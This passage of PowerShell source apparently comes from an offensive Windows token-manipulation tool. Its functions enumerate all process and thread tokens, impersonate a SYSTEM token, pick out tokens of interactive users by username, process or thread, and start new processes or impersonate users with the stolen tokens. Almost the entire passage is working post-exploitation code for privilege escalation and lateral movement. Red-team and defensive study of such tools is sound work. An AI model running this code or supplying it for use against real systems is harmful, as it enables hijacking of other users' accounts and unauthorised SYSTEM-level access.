                    $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.Username.Buffer, $LogonSessionData.Username.Length/2)
                    $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.LoginDomain.Buffer, $LogonSessionData.LoginDomain.Length/2)

                    #If UserName is for the computer account, figure out what account it actually is (SYSTEM, NETWORK SERVICE)
                    #Only do this for the computer account because other accounts return correctly. Also, doing this for a domain account 
                    #results in querying the domain controller which is unwanted.
                    if ($Username -ieq "$($env:COMPUTERNAME)`$")
                    {
                        [UInt32]$Size = 100
                        [UInt32]$NumUsernameChar = $Size / 2
                        [UInt32]$NumDomainChar = $Size / 2
                        [UInt32]$SidNameUse = 0
                        $UsernameBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                        $DomainBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                        $Success = $LookupAccountSidW.Invoke([IntPtr]::Zero, $LogonSessionData.Sid, $UsernameBuffer, [Ref]$NumUsernameChar, $DomainBuffer, [Ref]$NumDomainChar, [Ref]$SidNameUse)

                        if ($Success)
                        {
                            $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($UsernameBuffer)
                            $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($DomainBuffer)
                        }
                        else
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning "Error calling LookupAccountSidW. Error code: $ErrorCode"
                        }

                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UsernameBuffer)
                        $UsernameBuffer = [IntPtr]::Zero
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($DomainBuffer)
                        $DomainBuffer = [IntPtr]::Zero
                    }

                    $ReturnObj = New-Object PSObject
                    $ReturnObj | Add-Member -Type NoteProperty -Name Domain -Value $Domain
                    $ReturnObj | Add-Member -Type NoteProperty -Name Username -Value $Username    
                    $ReturnObj | Add-Member -Type NoteProperty -Name hToken -Value $hToken
                    $ReturnObj | Add-Member -Type NoteProperty -Name LogonType -Value $LogonSessionData.LogonType


                    #Query additional info about the token such as if it is elevated
                    $ReturnObj | Add-Member -Type NoteProperty -Name IsElevated -Value $false

                    $TokenElevationSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_ELEVATION)
                    $TokenElevationPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenElevationSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenElevation, $TokenElevationPtr, $TokenElevationSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: $ErrorCode" 
                    }
                    else
                    {
                        $TokenElevation = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenelevationPtr, [Type]$TOKEN_ELEVATION)
                        if ($TokenElevation.TokenIsElevated -ne 0)
                        {
                            $ReturnObj.IsElevated = $true
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenElevationPtr)


                    #Query the token type to determine if the token is a primary or impersonation token
                    $ReturnObj | Add-Member -Type NoteProperty -Name TokenType -Value "UnableToRetrieve"

                    [UInt32]$TokenTypeSize = 4
                    [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypeSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenType, $TokenTypePtr, $TokenTypeSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        [UInt32]$TokenType = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenTypePtr, [Type][UInt32])
                        switch($TokenType)
                        {
                            1 {$ReturnObj.TokenType = "Primary"}
                            2 {$ReturnObj.TokenType = "Impersonation"}
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)


                    #Query the impersonation level if the token is an Impersonation token
                    if ($ReturnObj.TokenType -ieq "Impersonation")
                    {
                        $ReturnObj | Add-Member -Type NoteProperty -Name ImpersonationLevel -Value "UnableToRetrieve"

                        [UInt32]$ImpersonationLevelSize = 4
                        [IntPtr]$ImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ImpersonationLevelSize) #sizeof uint32
                        [UInt32]$RealSize = 0
                        $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenImpersonationLevel, $ImpersonationLevelPtr, $ImpersonationLevelSize, [Ref]$RealSize)
                        if (-not $Success)
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
                        }
                        else
                        {
                            [UInt32]$ImpersonationLevel = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImpersonationLevelPtr, [Type][UInt32])
                            switch ($ImpersonationLevel)
                            {
                                0 { $ReturnObj.ImpersonationLevel = "SecurityAnonymous" }
                                1 { $ReturnObj.ImpersonationLevel = "SecurityIdentification" }
                                2 { $ReturnObj.ImpersonationLevel = "SecurityImpersonation" }
                                3 { $ReturnObj.ImpersonationLevel = "SecurityDelegation" }
                            }
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ImpersonationLevelPtr)
                    }


                    #Query the token sessionid
                    $ReturnObj | Add-Member -Type NoteProperty -Name SessionID -Value "Unknown"

                    [UInt32]$TokenSessionIdSize = 4
                    [IntPtr]$TokenSessionIdPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenSessionIdSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenSessionId, $TokenSessionIdPtr, $TokenSessionIdSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        [UInt32]$TokenSessionId = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenSessionIdPtr, [Type][UInt32])
                        $ReturnObj.SessionID = $TokenSessionId
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenSessionIdPtr)


                    #Query the token privileges
                    $ReturnObj | Add-Member -Type NoteProperty -Name PrivilegesEnabled -Value @()
                    $ReturnObj | Add-Member -Type NoteProperty -Name PrivilegesAvailable -Value @()

                    [UInt32]$TokenPrivilegesSize = 1000
                    [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenPrivileges, $TokenPrivilegesPtr, $TokenPrivilegesSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
                        
                        #Loop through each privilege
                        [IntPtr]$PrivilegesBasePtr = [IntPtr](Add-SignedIntAsUnsigned $TokenPrivilegesPtr ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]$TOKEN_PRIVILEGES, "Privileges")))
                        $LuidAndAttributeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
                        for ($i = 0; $i -lt $TokenPrivileges.PrivilegeCount; $i++)
                        {
                            $LuidAndAttributePtr = [IntPtr](Add-SignedIntAsUnsigned $PrivilegesBasePtr ($LuidAndAttributeSize * $i))

                            $LuidAndAttribute = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributePtr, [Type]$LUID_AND_ATTRIBUTES)

                            #Lookup privilege name
                            [UInt32]$PrivilegeNameSize = 60
                            $PrivilegeNamePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PrivilegeNameSize)
                            $PLuid = $LuidAndAttributePtr #The Luid structure is the first object in the LuidAndAttributes structure, so a ptr to LuidAndAttributes also points to Luid

                            $Success = $LookupPrivilegeNameW.Invoke([IntPtr]::Zero, $PLuid, $PrivilegeNamePtr, [Ref]$PrivilegeNameSize)
                            if (-not $Success)
                            {
                                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                                Write-Warning "Call to LookupPrivilegeNameW failed. Error code: $ErrorCode. RealSize: $PrivilegeNameSize"
                            }
                            $PrivilegeName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($PrivilegeNamePtr)

                            #Get the privilege attributes
                            $PrivilegeStatus = ""
                            $Enabled = $false

                            if ($LuidAndAttribute.Attributes -eq 0)
                            {
                                $Enabled = $false
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_ENABLED_BY_DEFAULT) -eq $Win32Constants.SE_PRIVILEGE_ENABLED_BY_DEFAULT) #enabled by default
                            {
                                $Enabled = $true
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_ENABLED) -eq $Win32Constants.SE_PRIVILEGE_ENABLED) #enabled
                            {
                                $Enabled = $true
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_REMOVED) -eq $Win32Constants.SE_PRIVILEGE_REMOVED) #SE_PRIVILEGE_REMOVED. This should never exist. Write a warning if it is found so I can investigate why/how it was found.
                            {
                                Write-Warning "Unexpected behavior: Found a token with SE_PRIVILEGE_REMOVED. Please report this as a bug. "
                            }

                            if ($Enabled)
                            {
                                $ReturnObj.PrivilegesEnabled += ,$PrivilegeName
                            }
                            else
                            {
                                $ReturnObj.PrivilegesAvailable += ,$PrivilegeName
                            }

                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($PrivilegeNamePtr)
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)

                }
                else
                {
                    Write-Verbose "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($LogonSessionData.UserName.Length)"
                }

                #Free LogonSessionData
                $ntstatus = $LsaFreeReturnBuffer.Invoke($LogonSessionDataPtr)
                $LogonSessionDataPtr = [IntPtr]::Zero
                if ($ntstatus -ne 0)
                {
                    Write-Warning "Call to LsaFreeReturnBuffer failed. Error code: $ntstatus"
                }
            }

            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
            $LuidPtr = [IntPtr]::Zero
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenStatsPtr)
        $TokenStatsPtr = [IntPtr]::Zero

        return $ReturnObj
    }


    #Takes an array of TokenObjects built by the script and returns the unique ones
    function Get-UniqueTokens
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [Object[]]
            $AllTokens
        )

        $TokenByUser = @{}
        $TokenByEnabledPriv = @{}
        $TokenByAvailablePriv = @{}

        #Filter tokens by user
        foreach ($Token in $AllTokens)
        {
            $Key = $Token.Domain + "\" + $Token.Username
            if (-not $TokenByUser.ContainsKey($Key))
            {
                #Filter out network logons and junk Windows accounts. This filter eliminates accounts which won't have creds because
                #    they are network logons (type 3) or logons for which the creds don't matter like LOCOAL SERVICE, DWM, etc..
                if ($Token.LogonType -ne 3 -and
                    $Token.Username -inotmatch "^DWM-\d+$" -and
                    $Token.Username -inotmatch "^LOCAL\sSERVICE$")
                {
                    $TokenByUser.Add($Key, $Token)
                }
            }
            else
            {
                #If Tokens have equal elevation levels, compare their privileges.
                if($Token.IsElevated -eq $TokenByUser[$Key].IsElevated)
                {
                    if (($Token.PrivilegesEnabled.Count + $Token.PrivilegesAvailable.Count) -gt ($TokenByUser[$Key].PrivilegesEnabled.Count + $TokenByUser[$Key].PrivilegesAvailable.Count))
                    {
                        $TokenByUser[$Key] = $Token
                    }
                }
                #If the new token is elevated and the current token isn't, use the new token
                elseif (($Token.IsElevated -eq $true) -and ($TokenByUser[$Key].IsElevated -eq $false))
                {
                    $TokenByUser[$Key] = $Token
                }
            }
        }

        #Filter tokens by privilege
        foreach ($Token in $AllTokens)
        {
            $Fullname = "$($Token.Domain)\$($Token.Username)"

            #Filter currently enabled privileges
            foreach ($Privilege in $Token.PrivilegesEnabled)
            {
                if ($TokenByEnabledPriv.ContainsKey($Privilege))
                {
                    if($TokenByEnabledPriv[$Privilege] -notcontains $Fullname)
                    {
                        $TokenByEnabledPriv[$Privilege] += ,$Fullname
                    }
                }
                else
                {
                    $TokenByEnabledPriv.Add($Privilege, @($Fullname))
                }
            }

            #Filter currently available (but not enable) privileges
            foreach ($Privilege in $Token.PrivilegesAvailable)
            {
                if ($TokenByAvailablePriv.ContainsKey($Privilege))
                {
                    if($TokenByAvailablePriv[$Privilege] -notcontains $Fullname)
                    {
                        $TokenByAvailablePriv[$Privilege] += ,$Fullname
                    }
                }
                else
                {
                    $TokenByAvailablePriv.Add($Privilege, @($Fullname))
                }
            }
        }

        $ReturnDict = @{
            TokenByUser = $TokenByUser
            TokenByEnabledPriv = $TokenByEnabledPriv
            TokenByAvailablePriv = $TokenByAvailablePriv
        }

        return (New-Object PSObject -Property $ReturnDict)
    }


    function Invoke-ImpersonateUser
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken
        )

        #Duplicate the token so it can be used to create a new process
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken) #todo does this need to be freed
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $Success = $ImpersonateLoggedOnUser.Invoke($NewHToken)
            if (-not $Success)
            {
                $Errorcode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to ImpersonateLoggedOnUser. Error code: $Errorcode"
            }
        }

        $Success = $CloseHandle.Invoke($NewHToken)
        $NewHToken = [IntPtr]::Zero
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
        }

        return $Success
    }


    function Create-ProcessWithToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken,

            [Parameter(Position=1, Mandatory=$true)]
            [String]
            $ProcessName,

            [Parameter(Position=2)]
            [String]
            $ProcessArgs,

            [Parameter(Position=3)]
            [Switch]
            $PassThru
        )
        Write-Verbose "Entering Create-ProcessWithToken"
        #Duplicate the token so it can be used to create a new process
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
            [IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
            $memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) #The first parameter (cb) is a DWORD which is the size of the struct

            $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
            [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)

            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$ProcessName")
            $ProcessArgsPtr = [IntPtr]::Zero
            if (-not [String]::IsNullOrEmpty($ProcessArgs))
            {
                $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$ProcessName`" $ProcessArgs")
            }
            
            $FunctionName = ""
            if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
            {
                #Cannot use CreateProcessWithTokenW when in Session0 because CreateProcessWithTokenW throws an ACCESS_DENIED error. I believe it is because
                #this API attempts to modify the desktop ACL. I would just use this API all the time, but it requires that I enable SeAssignPrimaryTokenPrivilege
                #which is not ideal. 
                Write-Verbose "Running in Session 0. Enabling SeAssignPrimaryTokenPrivilege and calling CreateProcessAsUserW to create a process with alternate token."
                Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
                $Success = $CreateProcessAsUserW.Invoke($NewHToken, $ProcessNamePtr, $ProcessArgsPtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
                $FunctionName = "CreateProcessAsUserW"
            }
            else
            {
                Write-Verbose "Not running in Session 0, calling CreateProcessWithTokenW to create a process with alternate token."
                $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x0, $ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
                $FunctionName = "CreateProcessWithTokenW"
            }
            if ($Success)
            {
                #Free the handles returned in the ProcessInfo structure
                $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)
                $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
                $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null

		#Pass created System.Diagnostics.Process object to pipeline
		if ($PassThru) {
			#Retrieving created System.Diagnostics.Process object
			$returnProcess = Get-Process -Id $ProcessInfo.dwProcessId

			#Caching process handle so we don't lose it when the process exits
			$null = $returnProcess.Handle

			#Passing System.Diagnostics.Process object to pipeline
			$returnProcess
		}
            }
            else
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "$FunctionName failed. Error code: $ErrorCode"
            }

            #Free StartupInfo memory and ProcessInfo memory
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StartupInfoPtr)
            $StartupInfoPtr = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
            $ProcessInfoPtr = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)
            $ProcessNamePtr = [IntPtr]::Zero

            #Close handle for the token duplicated with DuplicateTokenEx
            $Success = $CloseHandle.Invoke($NewHToken)
            $NewHToken = [IntPtr]::Zero
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
            }
        }
    }


    function Free-AllTokens
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [PSObject[]]
            $TokenInfoObjs
        )

        foreach ($Obj in $TokenInfoObjs)
        {
            $Success = $CloseHandle.Invoke($Obj.hToken)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose "Failed to close token handle in Free-AllTokens. ErrorCode: $ErrorCode"
            }
            $Obj.hToken = [IntPtr]::Zero
        }
    }


    #Enumerate all tokens on the system. Returns an array of objects with the token and information about the token.
    function Enum-AllTokens
    {
        $AllTokens = @()

        #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
        #Even if already running as system, later parts on the script depend on having a SYSTEM token with most privileges.
        #We need to enumrate all processes running as SYSTEM and find one that we can use.
        [string]$LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value
        $SystemTokens = Get-Process -IncludeUserName | Where {$_.Username -eq $LocalSystemNTAccount}
        ForEach ($SystemToken in $SystemTokens)
        {
            $SystemTokenInfo = Get-PrimaryToken -ProcessId $SystemToken.Id -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
        }
        if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
        {
            Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
        }

        if ($systemTokenInfo -ne $null -and $systemTokenInfo.hProcToken -ne [IntPtr]::Zero)
        {
            $CloseHandle.Invoke($systemTokenInfo.hProcToken) | Out-Null
            $systemTokenInfo = $null
        }

        $ProcessIds = get-process | where {$_.name -inotmatch "^csrss$" -and $_.name -inotmatch "^system$" -and $_.id -ne 0}

        #Get all tokens
        foreach ($Process in $ProcessIds)
        {
            $PrimaryTokenInfo = (Get-PrimaryToken -ProcessId $Process.Id -FullPrivs)

            #If a process is a protected process, it's primary token cannot be obtained. Don't try to enumerate it.
            if ($PrimaryTokenInfo -ne $null)
            {
                [IntPtr]$hToken = [IntPtr]$PrimaryTokenInfo.hProcToken

                if ($hToken -ne [IntPtr]::Zero)
                {
                    #Get the LUID corrosponding to the logon
                    $ReturnObj = Get-TokenInformation -hToken $hToken
                    if ($ReturnObj -ne $null)
                    {
                        $ReturnObj | Add-Member -MemberType NoteProperty -Name ProcessId -Value $Process.Id

                        $AllTokens += $ReturnObj
                    }
                }
                else
                {
                    Write-Warning "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id)"
                }

                foreach ($Thread in $Process.Threads)
                {
                    $ThreadTokenInfo = Get-ThreadToken -ThreadId $Thread.Id
                    [IntPtr]$hToken = ($ThreadTokenInfo.hThreadToken)

                    if ($hToken -ne [IntPtr]::Zero)
                    {
                        $ReturnObj = Get-TokenInformation -hToken $hToken
                        if ($ReturnObj -ne $null)
                        {
                            $ReturnObj | Add-Member -MemberType NoteProperty -Name ThreadId -Value $Thread.Id
                    
                            $AllTokens += $ReturnObj
                        }
                    }
                }
            }
        }

        return $AllTokens
    }


    function Invoke-RevertToSelf
    {
        Param(
            [Parameter(Position=0)]
            [Switch]
            $ShowOutput
        )

        $Success = $RevertToSelf.Invoke()

        if ($ShowOutput)
        {
            if ($Success)
            {
                Write-Output "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            else
            {
                Write-Output "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
        }
    }


    #Main function
    function Main
    {
        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
        {
            Write-Error "Script must be run as administrator" -ErrorAction Stop
        }

        #If running in session 0, force NoUI
        if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
        {
            Write-Verbose "Running in Session 0, forcing NoUI (processes in Session 0 cannot have a UI)"
            $NoUI = $true
        }

        if ($PsCmdlet.ParameterSetName -ieq "RevToSelf")
        {
            Invoke-RevertToSelf -ShowOutput
        }
        elseif ($PsCmdlet.ParameterSetName -ieq "CreateProcess" -or $PsCmdlet.ParameterSetName -ieq "ImpersonateUser")
        {
            $AllTokens = Enum-AllTokens
            
            #Select the token to use
            [IntPtr]$hToken = [IntPtr]::Zero
            $UniqueTokens = (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser
            if ($Username -ne $null -and $Username -ne '')
            {
                if ($UniqueTokens.ContainsKey($Username))
                {
                    $hToken = $UniqueTokens[$Username].hToken
                    Write-Verbose "Selecting token by username"
                }
                else
                {
                    Write-Error "A token belonging to the specified username was not found. Username: $($Username)" -ErrorAction Stop
                }
            }
            elseif ( $ProcessId -ne $null -and $ProcessId -ne 0)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $ProcessId)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose "Selecting token by ProcessID"
                    }
                }

                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($ThreadId -ne $null -and $ThreadId -ne 0)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | Get-Member ThreadId) -and $Token.ThreadId -eq $ThreadId)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose "Selecting token by ThreadId"
                    }
                }

                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($Process -ne $null)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $Process.Id)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose "Selecting token by Process object"
                    }
                }

                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            else
            {
                Write-Error "Must supply a Username, ProcessId, ThreadId, or Process object"  -ErrorAction Stop
            }

            #Use the token for the selected action
            if ($PsCmdlet.ParameterSetName -ieq "CreateProcess")
            {
                if (-not $NoUI)
                {
                    Set-DesktopACLs
                }

                Create-ProcessWithToken -hToken $hToken -ProcessName $CreateProcess -ProcessArgs $ProcessArgs -PassThru:$PassThru

                Invoke-RevertToSelf
            }
            elseif ($ImpersonateUser)
            {
                Invoke-ImpersonateUser -hToken $hToken | Out-Null
                Write-Output "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }

            Free-AllTokens -TokenInfoObjs $AllTokens
        }
        elseif ($PsCmdlet.ParameterSetName -ieq "WhoAmI")
        {
            Write-Output "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else #Enumerate tokens
        {
            $AllTokens = Enum-AllTokens

            if ($PsCmdlet.ParameterSetName -ieq "ShowAll")
            {
                Write-Output $AllTokens
            }
            else
            {
                Write-Output (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser.Values
            }

            Invoke-RevertToSelf

            Free-AllTokens -TokenInfoObjs $AllTokens
        }
    }


    #Start the main function
    Main
}
